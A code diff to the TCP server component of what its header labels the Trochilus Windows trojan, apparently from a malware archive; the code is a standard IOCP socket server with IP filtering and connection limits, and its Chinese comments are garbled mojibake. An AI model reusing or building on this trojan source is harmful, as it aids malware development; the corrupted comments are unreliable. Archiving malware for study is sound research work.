@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "TcpServer.h"
 
@@ -119,7 +130,7 @@ BOOL TcpServer::StartListening( UINT port, DWORD dwSessionDataSize, DWORD dwSile
 	m_dwSessionDataSize = dwSessionDataSize;
 
 
-	// ´´½¨Ì×½Ó×Ö
+	// ï¿½ï¿½ï¿½ï¿½ï¿½×½ï¿½ï¿½ï¿½
 	m_sServer = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (INVALID_SOCKET == m_sServer)
 	{
@@ -128,7 +139,7 @@ BOOL TcpServer::StartListening( UINT port, DWORD dwSessionDataSize, DWORD dwSile
 		goto END;
 	}
 
-	// °ó¶¨Ì×½Ó×Ö
+	// ï¿½ï¿½ï¿½×½ï¿½ï¿½ï¿½
 	SOCKADDR_IN local;
 	local.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
 	local.sin_family = AF_INET;
@@ -140,7 +151,7 @@ BOOL TcpServer::StartListening( UINT port, DWORD dwSessionDataSize, DWORD dwSile
 		goto END;
 	}
 
-	// ¿ªÊ¼¼àÌý
+	// ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½
 	if (0 != ::listen(m_sServer, SOMAXCONN))
 	{
 		errorLog(_T("start listening failed. WE%u"), ::WSAGetLastError());
@@ -214,7 +225,7 @@ void TcpServer::ServerProc()
 
 	do 
 	{
-		// ³õÊ¼»¯Íê³É¶Ë¿Ú
+		// ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½É¶Ë¿ï¿½
 		m_hCompletionPort = ::CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
 		if (NULL == m_hCompletionPort)
 		{
@@ -223,7 +234,7 @@ void TcpServer::ServerProc()
 			break;
 		}
 
-		// ÓÐ¼¸¸öCPU¾Í´´½¨¼¸¸ö¹¤×÷ÕßÏß³Ì
+		// ï¿½Ð¼ï¿½ï¿½ï¿½CPUï¿½Í´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß³ï¿½
 		SYSTEM_INFO systeminfo = {0};
 		::GetSystemInfo(&systeminfo);
 		for (DWORD i = 0; i < systeminfo.dwNumberOfProcessors * m_dwWorkerThreadNumCpuMultipe; i++)
@@ -232,11 +243,11 @@ void TcpServer::ServerProc()
 			m_workerThreadList.push_back(hThread);
 		}
 
-		//Ö÷½ø³ÌµÄÕâ¸öÑ­»·ÖÐÑ­»·µÈ´ý¿Í»§¶ËÁ¬½Ó£¬ÈôÓÐÁ¬½Ó£¬Ôò½«¸Ã¿Í»§Ì×½Ó×ÖÓÚÍê³É¶Ë¿Ú°ó¶¨µ½Ò»Æð
-		//È»ºó¿ªÊ¼Òì²½µÈ´ý½ÓÊÕ¿Í»§´«À´µÄÊý¾Ý¡£
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ìµï¿½ï¿½ï¿½ï¿½Ñ­ï¿½ï¿½ï¿½ï¿½Ñ­ï¿½ï¿½ï¿½È´ï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó£ï¿½ï¿½ò½«¸Ã¿Í»ï¿½ï¿½×½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½É¶Ë¿Ú°ó¶¨µï¿½Ò»ï¿½ï¿½
+		//È»ï¿½ï¿½Ê¼ï¿½ì²½ï¿½È´ï¿½ï¿½ï¿½ï¿½Õ¿Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý¡ï¿½
 		while (m_bRunning)
 		{
-			// Èç¹û½Óµ½¿Í»§ÇëÇóÁ¬½Ó£¬Ôò¼ÌÐø£¬·ñÔòµÈ´ý¡£
+			// ï¿½ï¿½ï¿½ï¿½Óµï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È´ï¿½ï¿½ï¿½
 			SOCKADDR_IN clientAddr;
 			int iAddrSize = sizeof(SOCKADDR_IN);
 			SOCKET sClient = ::accept(m_sServer, (struct sockaddr *)&clientAddr, &iAddrSize);
@@ -251,17 +262,17 @@ void TcpServer::ServerProc()
 				m_clientSocketList.push_back(sClient);
 			}
 			::LeaveCriticalSection(&m_dataSection);
-			//ÉèÖÃ½ÓÊÕ»º³åÇø
+			//ï¿½ï¿½ï¿½Ã½ï¿½ï¿½Õ»ï¿½ï¿½ï¿½ï¿½ï¿½
 			int iRecvBuf = TCPMSGSIZE;
 			if ( 0 != setsockopt(sClient, SOL_SOCKET, SO_RCVBUF, (const char*)&iRecvBuf, sizeof(int)))
 			{
 				errorLog(_T("setsockopt socket failed. WE:%u"), ::WSAGetLastError());
 			}
 
-			//clientÖÐ±£´æÓÃ»§ÐÅÏ¢¡£
+			//clientï¿½Ð±ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½
 			debugLog(_T("Accepted client:%s:%d"), CString(inet_ntoa(clientAddr.sin_addr)), ntohs(clientAddr.sin_port));
 
-			//¼ì²éÊÇ·ñÊÇÐí¿ÉµÄIP
+			//ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Éµï¿½IP
 			if (! IsAllowedIP(clientAddr.sin_addr))
 			{
 				infoLog(_T("disconnect unallowed ip : %s"), CString(inet_ntoa(clientAddr.sin_addr)));
@@ -269,7 +280,7 @@ void TcpServer::ServerProc()
 				continue;
 			}
 
-			//¼ì²é¸ÃipµÄÁ¬½ÓÊÇ·ñ³¬¹ýÏÞÖÆ
+			//ï¿½ï¿½ï¿½ï¿½ipï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ñ³¬¹ï¿½ï¿½ï¿½ï¿½ï¿½
 			if (IsConnectionExceed(clientAddr.sin_addr))
 			{
 				errorLog(_T("connection exceed limit. ip : %s"), CString(inet_ntoa(clientAddr.sin_addr)));
@@ -277,8 +288,8 @@ void TcpServer::ServerProc()
 				continue;
 			}
 
-			//½«Õâ¸ö×îÐÂµ½À´µÄ¿Í»§Ì×½Ó×ÖºÍÍê³É¶Ë¿Ú°ó¶¨µ½Ò»Æð¡£
-			//µÚÈý¸ö²ÎÊý±íÊ¾´«µÝµÄ²ÎÊý£¬ÕâÀï¾Í´«µÝµÄ¿Í»§Ì×½Ó×ÖµØÖ·¡£×îºóÒ»¸ö²ÎÊýÎª0 ±íÊ¾ÓÐºÍCPUÒ»ÑùµÄ½ø³ÌÊý¡£¼´1¸öCPUÒ»¸öÏß³Ì
+			//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Âµï¿½ï¿½ï¿½ï¿½Ä¿Í»ï¿½ï¿½×½ï¿½ï¿½Öºï¿½ï¿½ï¿½É¶Ë¿Ú°ó¶¨µï¿½Ò»ï¿½ï¿½
+			//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ÝµÄ²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í´ï¿½ï¿½ÝµÄ¿Í»ï¿½ï¿½×½ï¿½ï¿½Öµï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îª0 ï¿½ï¿½Ê¾ï¿½Ðºï¿½CPUÒ»ï¿½ï¿½ï¿½Ä½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1ï¿½ï¿½CPUÒ»ï¿½ï¿½ï¿½ß³ï¿½
 			if (NULL == CreateIoCompletionPort((HANDLE)sClient, m_hCompletionPort, (ULONG_PTR)sClient, 0))
 			{
 				errorLog(_T("bind socket to iocompletionport failed. WE:%u"), ::WSAGetLastError());
@@ -286,7 +297,7 @@ void TcpServer::ServerProc()
 				continue;
 			}
 
-			// ³õÊ¼»¯½á¹¹Ìå
+			// ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½á¹¹ï¿½ï¿½
 			DWORD dwPerIODataSize = sizeof(PER_IO_OPERATION_DATA) + m_dwSessionDataSize;
 			LPPER_IO_OPERATION_DATA lpPerIOData = (LPPER_IO_OPERATION_DATA)HeapAlloc(
 				GetProcessHeap(),
@@ -301,12 +312,12 @@ void TcpServer::ServerProc()
 
 			AddData(lpPerIOData);
 
-			::WSARecv(sClient,         //Òì²½½ÓÊÕÏûÏ¢£¬Á¢¿Ì·µ»Ø¡£
-				&lpPerIOData->Buffer, //»ñµÃ½ÓÊÕµÄÊý¾Ý
+			::WSARecv(sClient,         //ï¿½ì²½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½Ì·ï¿½ï¿½Ø¡ï¿½
+				&lpPerIOData->Buffer, //ï¿½ï¿½Ã½ï¿½ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½
 				1,       //The number of WSABUF structures in the lpBuffers array.
-				&lpPerIOData->NumberOfBytesRecvd, //½ÓÊÕµ½µÄ×Ö½ÚÊý£¬Èç¹û´íÎó·µ»Ø0
-				&lpPerIOData->Flags,       //²ÎÊý£¬ÏÈ²»¹Ü
-				&lpPerIOData->overlap,     //ÊäÈëÕâ¸ö½á¹¹Ìå¿©¡£
+				&lpPerIOData->NumberOfBytesRecvd, //ï¿½ï¿½ï¿½Õµï¿½ï¿½ï¿½ï¿½Ö½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ó·µ»ï¿½0
+				&lpPerIOData->Flags,       //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È²ï¿½ï¿½ï¿½
+				&lpPerIOData->overlap,     //ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½á¹¹ï¿½å¿©ï¿½ï¿½
 				NULL);
 		}
 	} while (FALSE);
@@ -346,13 +357,13 @@ void TcpServer::WorkerProc()
 	{
 		DISCONNECT_REASON disconnectReason = DISCONNECTREASON_UNKNOWN;
 
-		//Óöµ½¿ÉÒÔ½ÓÊÕÊý¾ÝÔò·µ»Ø£¬·ñÔòµÈ´ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ò·µ»Ø£ï¿½ï¿½ï¿½ï¿½ï¿½È´ï¿½
 		BOOL bRet = ::GetQueuedCompletionStatus( 
 			m_hCompletionPort,
-			&dwBytesTransferred, //·µ»ØµÄ×ÖÊý
-			(PULONG_PTR)&sClient,           //ÊÇÏìÓ¦µÄÄÄ¸ö¿Í»§Ì×½Ó×Ö£¿
-			(LPOVERLAPPED*)&lpPerIOData, //µÃµ½¸ÃÌ×½Ó×Ö±£´æµÄIOÐÅÏ¢
-			INFINITE);               //ÎÞÏÞµÈ´ý¿©¡£²»³¬Ê±µÄÄÇÖÖ¡£
+			&dwBytesTransferred, //ï¿½ï¿½ï¿½Øµï¿½ï¿½ï¿½ï¿½ï¿½
+			(PULONG_PTR)&sClient,           //ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½Ä¸ï¿½ï¿½Í»ï¿½ï¿½×½ï¿½ï¿½Ö£ï¿½
+			(LPOVERLAPPED*)&lpPerIOData, //ï¿½Ãµï¿½ï¿½ï¿½ï¿½×½ï¿½ï¿½Ö±ï¿½ï¿½ï¿½ï¿½IOï¿½ï¿½Ï¢
+			INFINITE);               //ï¿½ï¿½ï¿½ÞµÈ´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½Ö¡ï¿½
 		if (! bRet)
 		{
 			DWORD dwError = ::GetLastError();
@@ -372,13 +383,13 @@ void TcpServer::WorkerProc()
 			}
 		}
 
-		//×¼±¸ÍË³ö
+		//×¼ï¿½ï¿½ï¿½Ë³ï¿½
 		if (dwBytesTransferred == 0xFFFFFFFF)
 		{
 			break;
 		}
 
-		// Á¬½Ó±»¿Í»§¶Ë¹Ø±Õ
+		// ï¿½ï¿½ï¿½Ó±ï¿½ï¿½Í»ï¿½ï¿½Ë¹Ø±ï¿½
 		if (dwBytesTransferred == 0)
 		{
 			if (disconnectReason == DISCONNECTREASON_UNKNOWN) disconnectReason = DISCONNECTREASON_CLIENT_DISCONNECT;
@@ -391,17 +402,17 @@ void TcpServer::WorkerProc()
 			RemoveData(lpPerIOData);
 			DecreaseConnectionByIP(lpPerIOData->addr.sin_addr);
 			if (sClient != INVALID_SOCKET) ::closesocket(sClient);
-			::HeapFree(GetProcessHeap(), 0, lpPerIOData);        //ÊÍ·Å½á¹¹Ìå
+			::HeapFree(GetProcessHeap(), 0, lpPerIOData);        //ï¿½Í·Å½á¹¹ï¿½ï¿½
 
 			continue;
 		}
 
 		lpPerIOData->NumberOfBytesRecvd = dwBytesTransferred;
 
-		//½«Ê±¼ä´ÁÉèÖÃÎª0£¬±ÜÃâ±»³¬Ê±ÈÎÎñÇåÀíµô
+		//ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îª0ï¿½ï¿½ï¿½ï¿½ï¿½â±»ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		lpPerIOData->lastSpeekTime = 0;
 
-		//´¦ÀíÊý¾Ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		BOOL bKeepConnection = TRUE;
 		if (m_fnCallback != NULL)
 		{
@@ -420,12 +431,12 @@ void TcpServer::WorkerProc()
 			RemoveData(lpPerIOData);
 			DecreaseConnectionByIP(lpPerIOData->addr.sin_addr);
 			::closesocket(sClient);
-			::HeapFree(GetProcessHeap(), 0, lpPerIOData);        //ÊÍ·Å½á¹¹Ìå
+			::HeapFree(GetProcessHeap(), 0, lpPerIOData);        //ï¿½Í·Å½á¹¹ï¿½ï¿½
 
 			continue;
 		}
 
-		//¸üÐÂÊ±¼ä´Á
+		//ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½
 		_time64(&lpPerIOData->lastSpeekTime);
 
 		// Launch another asynchronous operation for sClient
@@ -438,7 +449,7 @@ void TcpServer::WorkerProc()
 		lpPerIOData->Buffer.len = TCPMSGSIZE;
 		lpPerIOData->Buffer.buf = lpPerIOData->szMessage;
 
-		::WSARecv(sClient,               //Ñ­»·½ÓÊÕ
+		::WSARecv(sClient,               //Ñ­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 			&lpPerIOData->Buffer,
 			1,
 			&lpPerIOData->NumberOfBytesRecvd,
@@ -518,16 +529,16 @@ BOOL TcpServer::IsAllowedIP(IN_ADDR ip) const
 
 	CString ipstr((LPCSTR)inet_ntoa(ip));
 
-	//ÔÚip¼¯ºÏÖÐ½øÐÐ²éÕÒ
+	//ï¿½ï¿½ipï¿½ï¿½ï¿½ï¿½ï¿½Ð½ï¿½ï¿½Ð²ï¿½ï¿½ï¿½
 	BOOL bFound = (m_ipSet.find(ipstr) != m_ipSet.end());
 
-	//Èç¹ûÔÚip¼¯ºÏÖÐÕÒµ½ÁË¸ÃipÔò¿ÉÒÔ×ö³ö½áÂÛÁË
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ipï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òµï¿½ï¿½Ë¸ï¿½ipï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	if (bFound)
 	{
 		return (! m_bIsBlackIPSet);
 	}
 	
-	//ÔÚÓòÃû¼¯ºÏÖÐ½øÐÐ²éÕÒ
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð½ï¿½ï¿½Ð²ï¿½ï¿½ï¿½
 	SingleIPOrNameSet::const_iterator iter = m_nameSet.begin();
 	for (; iter != m_nameSet.end(); iter++)
 	{
@@ -539,7 +550,7 @@ BOOL TcpServer::IsAllowedIP(IN_ADDR ip) const
 		}
 	}
 	
-	//Ã»ÓÐÕÒµ½Æ¥ÅäµÄip»òÕßÓòÃû
+	//Ã»ï¿½ï¿½ï¿½Òµï¿½Æ¥ï¿½ï¿½ï¿½ipï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	return m_bIsBlackIPSet;
 }
 
